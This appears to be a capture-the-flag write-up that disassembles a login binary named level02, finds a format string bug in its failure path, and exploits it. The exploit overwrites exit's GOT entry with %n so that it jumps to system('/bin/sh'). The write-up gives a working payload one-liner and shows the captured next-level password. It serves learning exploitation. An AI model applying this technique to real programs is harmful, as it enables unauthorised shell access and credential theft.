# PRINTF FORMAT STRING VULNERABILITY, OVERWRITE GOT EXIT() ENTRY

```asm
0000000000400814 <main>:
  400814:	55                   	push   rbp
  400815:	48 89 e5             	mov    rbp,rsp
  400818:	48 81 ec 20 01 00 00 	sub    rsp,0x120
```
- Stack frame is 0x120 (288) bytes large

```asm
  40081f:	89 bd ec fe ff ff    	mov    DWORD PTR [rbp-0x114],edi
  400825:	48 89 b5 e0 fe ff ff 	mov    QWORD PTR [rbp-0x120],rsi
  40082c:	48 8d 55 90          	lea    rdx,[rbp-0x70]
  400830:	b8 00 00 00 00       	mov    eax,0x0
  400835:	b9 0c 00 00 00       	mov    ecx,0xc
  40083a:	48 89 d7             	mov    rdi,rdx
  40083d:	f3 48 ab             	rep stos QWORD PTR es:[rdi],rax
```
- Clear 12 (0xc) bytes at [rbp-0x70] with 0s (a buffer for user input)

```asm
  400840:	48 89 fa             	mov    rdx,rdi
  400843:	89 02                	mov    DWORD PTR [rdx],eax
  400845:	48 83 c2 04          	add    rdx,0x4
  400849:	48 8d 95 60 ff ff ff 	lea    rdx,[rbp-0xa0]
  400850:	b8 00 00 00 00       	mov    eax,0x0
  400855:	b9 05 00 00 00       	mov    ecx,0x5
  40085a:	48 89 d7             	mov    rdi,rdx
  40085d:	f3 48 ab             	rep stos QWORD PTR es:[rdi],rax
```
- Clear 5 (0x5) bytes at [rbp-0xa0] with 0s (another buffer for user input)

```asm
  400860:	48 89 fa             	mov    rdx,rdi
  400863:	88 02                	mov    BYTE PTR [rdx],al
  400865:	48 83 c2 01          	add    rdx,0x1
  400869:	48 8d 95 f0 fe ff ff 	lea    rdx,[rbp-0x110]
  400870:	b8 00 00 00 00       	mov    eax,0x0
  400875:	b9 0c 00 00 00       	mov    ecx,0xc
  40087a:	48 89 d7             	mov    rdi,rdx
  40087d:	f3 48 ab             	rep stos QWORD PTR es:[rdi],rax
```
- Clear 12 (0xc) bytes at [rbp-0x110] with 0s (another buffer for user input)

```shell
(gdb) p (char*) 0x400bb0
$1 = 0x400bb0 "r"
(gdb) p (char*) 0x400bb2
$2 = 0x400bb2 "/home/users/level03/.pass"
(gdb) p (char*) 0x400bd0
$3 = 0x400bd0 "ERROR: failed to open password file\n"
```
```asm
  400898:	ba b0 0b 40 00       	mov    edx,0x400bb0
  40089d:	b8 b2 0b 40 00       	mov    eax,0x400bb2
  4008a2:	48 89 d6             	mov    rsi,rdx
  4008a5:	48 89 c7             	mov    rdi,rax
  4008a8:	e8 53 fe ff ff       	call   400700 <fopen@plt>
  4008ad:	48 89 45 f8          	mov    QWORD PTR [rbp-0x8],rax
  4008b1:	48 83 7d f8 00       	cmp    QWORD PTR [rbp-0x8],0x0
  4008b6:	75 2e                	jne    4008e6 <main+0xd2>
  4008b8:	48 8b 05 91 09 20 00 	mov    rax,QWORD PTR [rip+0x200991]        # 601250 <stderr@@GLIBC_2.2.5>
  4008bf:	48 89 c2             	mov    rdx,rax
  4008c2:	b8 d0 0b 40 00       	mov    eax,0x400bd0
  4008c7:	48 89 d1             	mov    rcx,rdx
  4008ca:	ba 24 00 00 00       	mov    edx,0x24
  4008cf:	be 01 00 00 00       	mov    esi,0x1
  4008d4:	48 89 c7             	mov    rdi,rax
  4008d7:	e8 44 fe ff ff       	call   400720 <fwrite@plt>
  4008dc:	bf 01 00 00 00       	mov    edi,0x1
  4008e1:	e8 2a fe ff ff       	call   400710 <exit@plt>
```
- Open the file "/home/users/level03/.pass" in read mode, store the file pointer in [rbp-0x8]
- If fopen failed, print an error message and exit with code 1

```asm
  4008e6:	48 8d 85 60 ff ff ff 	lea    rax,[rbp-0xa0]
  4008ed:	48 8b 55 f8          	mov    rdx,QWORD PTR [rbp-0x8]
  4008f1:	48 89 d1             	mov    rcx,rdx
  4008f4:	ba 29 00 00 00       	mov    edx,0x29
  4008f9:	be 01 00 00 00       	mov    esi,0x1
  4008fe:	48 89 c7             	mov    rdi,rax
  400901:	e8 8a fd ff ff       	call   400690 <fread@plt>
```
- Read 0x29 (41) bytes from "/home/users/level03/.pass" file into the buffer at [rbp-0xa0]

```shell
(gdb) p (char*) 0x400bf5
$4 = 0x400bf5 "\n"
```
```asm
  400906:	89 45 f4             	mov    DWORD PTR [rbp-0xc],eax
  400909:	48 8d 85 60 ff ff ff 	lea    rax,[rbp-0xa0]
  400910:	be f5 0b 40 00       	mov    esi,0x400bf5
  400915:	48 89 c7             	mov    rdi,rax
  400918:	e8 b3 fd ff ff       	call   4006d0 <strcspn@plt>
  40091d:	c6 84 05 60 ff ff ff 	mov    BYTE PTR [rbp+rax*1-0xa0],0x0
```
- strcspn: (See manual) it returns the index of the first occurence of any character from the second argument in the first argument, or the length of the first argument if no such character is found
- Here, it is used to null-terminate the string read from the file at the first newline character, if not found at all it will null-terminate the string at the end of the read data

```shell
(gdb) p (char*) 0x400bf8
$5 = 0x400bf8 "ERROR: failed to read password file\n"
```
```asm
  400925:	83 7d f4 29          	cmp    DWORD PTR [rbp-0xc],0x29
  400929:	74 52                	je     40097d <main+0x169>
  40092b:	48 8b 05 1e 09 20 00 	mov    rax,QWORD PTR [rip+0x20091e]        # 601250 <stderr@@GLIBC_2.2.5>
  400932:	48 89 c2             	mov    rdx,rax
  400935:	b8 f8 0b 40 00       	mov    eax,0x400bf8
  40093a:	48 89 d1             	mov    rcx,rdx
  40093d:	ba 24 00 00 00       	mov    edx,0x24
  400942:	be 01 00 00 00       	mov    esi,0x1
  400947:	48 89 c7             	mov    rdi,rax
  40094a:	e8 d1 fd ff ff       	call   400720 <fwrite@plt>
  40094f:	48 8b 05 fa 08 20 00 	mov    rax,QWORD PTR [rip+0x2008fa]        # 601250 <stderr@@GLIBC_2.2.5>
  400956:	48 89 c2             	mov    rdx,rax
  400959:	b8 f8 0b 40 00       	mov    eax,0x400bf8
  40095e:	48 89 d1             	mov    rcx,rdx
  400961:	ba 24 00 00 00       	mov    edx,0x24
  400966:	be 01 00 00 00       	mov    esi,0x1
  40096b:	48 89 c7             	mov    rdi,rax
  40096e:	e8 ad fd ff ff       	call   400720 <fwrite@plt>
  400973:	bf 01 00 00 00       	mov    edi,0x1
  400978:	e8 93 fd ff ff       	call   400710 <exit@plt>
```
- If the number of bytes read is not 0x29, it means that there was an error reading the file, so it prints an error message and exits with code 1, it prevents the password to not be of the expected format (not 41 bytes long)

```shell
(gdb) p (char*) 0x400c20
$1 = 0x400c20 "===== [ Secure Access System v1.0 ] ====="
(gdb) p (char*) 0x400c50
$2 = 0x400c50 "/", '*' <repeats 39 times>, "\\"
(gdb) p (char*) 0x400c80
$3 = 0x400c80 "| You must login to access this system. |"
(gdb) p (char*) 0x400cb0
$4 = 0x400cb0 "\\", '*' <repeats 38 times>, "/"
(gdb) p (char*) 0x400cd9
$5 = 0x400cd9 "--[ Username: "
```
```asm
  40097d:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  400981:	48 89 c7             	mov    rdi,rax
  400984:	e8 17 fd ff ff       	call   4006a0 <fclose@plt>
  400989:	bf 20 0c 40 00       	mov    edi,0x400c20
  40098e:	e8 ed fc ff ff       	call   400680 <puts@plt>
  400993:	bf 50 0c 40 00       	mov    edi,0x400c50
  400998:	e8 e3 fc ff ff       	call   400680 <puts@plt>
  40099d:	bf 80 0c 40 00       	mov    edi,0x400c80
  4009a2:	e8 d9 fc ff ff       	call   400680 <puts@plt>
  4009a7:	bf b0 0c 40 00       	mov    edi,0x400cb0
  4009ac:	e8 cf fc ff ff       	call   400680 <puts@plt>
  4009b1:	b8 d9 0c 40 00       	mov    eax,0x400cd9
  4009b6:	48 89 c7             	mov    rdi,rax
  4009b9:	b8 00 00 00 00       	mov    eax,0x0
  4009be:	e8 fd fc ff ff       	call   4006c0 <printf@plt>
```
- Prints context strings

```shell
(gdb) p (char*) 0x400bf5
$6 = 0x400bf5 "\n"
```
```asm
  4009c3:	48 8b 05 7e 08 20 00 	mov    rax,QWORD PTR [rip+0x20087e]        # 601248 <__bss_start>
  4009ca:	48 89 c2             	mov    rdx,rax
  4009cd:	48 8d 45 90          	lea    rax,[rbp-0x70]
  4009d1:	be 64 00 00 00       	mov    esi,0x64
  4009d6:	48 89 c7             	mov    rdi,rax
  4009d9:	e8 12 fd ff ff       	call   4006f0 <fgets@plt>
  4009de:	48 8d 45 90          	lea    rax,[rbp-0x70]
  4009e2:	be f5 0b 40 00       	mov    esi,0x400bf5
  4009e7:	48 89 c7             	mov    rdi,rax
  4009ea:	e8 e1 fc ff ff       	call   4006d0 <strcspn@plt>
  4009ef:	c6 44 05 90 00       	mov    BYTE PTR [rbp+rax*1-0x70],0x0
```
- Reading 100 bytes (0x64) user input for a username into the buffer at [rbp-0x70], then null-terminate the string at the first newline character

```shell
(gdb) p (char*) 0x400ce8
$8 = 0x400ce8 "--[ Password: "
```
```asm
  4009f4:	b8 e8 0c 40 00       	mov    eax,0x400ce8
  4009f9:	48 89 c7             	mov    rdi,rax
  4009fc:	b8 00 00 00 00       	mov    eax,0x0
  400a01:	e8 ba fc ff ff       	call   4006c0 <printf@plt>
  400a06:	48 8b 05 3b 08 20 00 	mov    rax,QWORD PTR [rip+0x20083b]        # 601248 <__bss_start>
  400a0d:	48 89 c2             	mov    rdx,rax
  400a10:	48 8d 85 f0 fe ff ff 	lea    rax,[rbp-0x110]
  400a17:	be 64 00 00 00       	mov    esi,0x64
  400a1c:	48 89 c7             	mov    rdi,rax
  400a1f:	e8 cc fc ff ff       	call   4006f0 <fgets@plt>
  400a24:	48 8d 85 f0 fe ff ff 	lea    rax,[rbp-0x110]
  400a2b:	be f5 0b 40 00       	mov    esi,0x400bf5
  400a30:	48 89 c7             	mov    rdi,rax
  400a33:	e8 98 fc ff ff       	call   4006d0 <strcspn@plt>
  400a38:	c6 84 05 f0 fe ff ff 	mov    BYTE PTR [rbp+rax*1-0x110],0x0
```
- Reading 100 bytes (0x64) user input for a password into the buffer at [rbp-0x110], then null-terminate the string at the first newline character

```shell
(gdb) p (char*) 0x400cf8
$10 = 0x400cf8 '*' <repeats 41 times>
```
```asm
  400a40:	bf f8 0c 40 00       	mov    edi,0x400cf8
  400a45:	e8 36 fc ff ff       	call   400680 <puts@plt>
  400a4a:	48 8d 8d f0 fe ff ff 	lea    rcx,[rbp-0x110]
  400a51:	48 8d 85 60 ff ff ff 	lea    rax,[rbp-0xa0]
  400a58:	ba 29 00 00 00       	mov    edx,0x29
  400a5d:	48 89 ce             	mov    rsi,rcx
  400a60:	48 89 c7             	mov    rdi,rax
  400a63:	e8 08 fc ff ff       	call   400670 <strncmp@plt>
  400a68:	85 c0                	test   eax,eax
  400a6a:	75 2a                	jne    400a96 <main+0x282>
  ...
  400a96:	48 8d 45 90          	lea    rax,[rbp-0x70]
  400a9a:	48 89 c7             	mov    rdi,rax
  400a9d:	b8 00 00 00 00       	mov    eax,0x0
  400aa2:	e8 19 fc ff ff       	call   4006c0 <printf@plt>
  400aa7:	bf 3a 0d 40 00       	mov    edi,0x400d3a
  400aac:	e8 cf fb ff ff       	call   400680 <puts@plt>
  400ab1:	bf 01 00 00 00       	mov    edi,0x1
  400ab6:	e8 55 fc ff ff       	call   400710 <exit@plt>
```
- Compare the [rbp-0x110] buffer (user input password) with the [rbp-0xa0] buffer (password read from file), with a max length of 0x29 (41), if they are not equal, jump to the end of main() and before exit with code 1, it uses the user input as a format string, this is a vulnerability since we can write arbitrary data from it ("%n")

```shell
(gdb) p (char*) 0x400d22
$11 = 0x400d22 "Greetings, %s!\n"
(gdb) p (char*) 0x400d32
$12 = 0x400d32 "/bin/sh"
```
```asm
  400a6c:	b8 22 0d 40 00       	mov    eax,0x400d22
  400a71:	48 8d 55 90          	lea    rdx,[rbp-0x70]
  400a75:	48 89 d6             	mov    rsi,rdx
  400a78:	48 89 c7             	mov    rdi,rax
  400a7b:	b8 00 00 00 00       	mov    eax,0x0
  400a80:	e8 3b fc ff ff       	call   4006c0 <printf@plt>
  400a85:	bf 32 0d 40 00       	mov    edi,0x400d32
  400a8a:	e8 21 fc ff ff       	call   4006b0 <system@plt>
  400a8f:	b8 00 00 00 00       	mov    eax,0x0
  400a94:	c9                   	leave  
  400a95:	c3                   	ret    
  400a96:	48 8d 45 90          	lea    rax,[rbp-0x70]
  400a9a:	48 89 c7             	mov    rdi,rax
  400a9d:	b8 00 00 00 00       	mov    eax,0x0
  400aa2:	e8 19 fc ff ff       	call   4006c0 <printf@plt>
  400aa7:	bf 3a 0d 40 00       	mov    edi,0x400d3a
  400aac:	e8 cf fb ff ff       	call   400680 <puts@plt>
  400abb:	90                   	nop
```
- Otherwise (if strncmp([rbp-0x110], [rbp-0xa0], 41) == 0), print a greeting message with the username, then call system("/bin/sh") to spawn a shell

## Exploit
After the printf, exit is called, so we can overwrite the exit address in the PLT to lead to the part where system("/bin/sh") is called.

```shell
Dump of assembler code for function exit@plt:
 400710 <+0>:	jmp    QWORD PTR [rip+0x200b12]  # 0x601228 <exit@got.plt>
 400716 <+6>:	push   0xa
 40071b <+11>:	jmp    0x400660
End of assembler dump.
```
- Exit address : `0x601228` in little endian : `\x28\x12\x60\x00`

```shell
 400a7b <+615>:	mov    eax,0x0
 400a80 <+620>:	call   0x4006c0 <printf@plt>
 400a85 <+625>:	mov    edi,0x400d32  # here
 400a8a <+630>:	call   0x4006b0 <system@plt>
 400a8f <+635>:	mov    eax,0x0
 400a94 <+640>:	leave  
 400a95 <+641>:	ret
```
- Where we want to jump : `0x400a85`, in decimal `4196997`

```shell
~$ ./level02 
./level02
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: 1111 %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x
--[ Password: abcd
*****************************************
1111 ffffe4f0 0 61 2a2a2a2a 2a2a2a2a ffffe6e8 f7ff9a08 64636261 0 0 0 0 0 0 0 0 0 0 0 does not have access!
```
- The offset of the password input buffer is 8

```shell
~$ (python -c 'print "%4196997d" + "%8$n"' ; python -c 'print "\x28\x12\x60"'; cat) | ./level02
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: --[ Password: *****************************************

                                                [...]-6928 does not have access!
cat /home/users/level03/.pass
Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
```
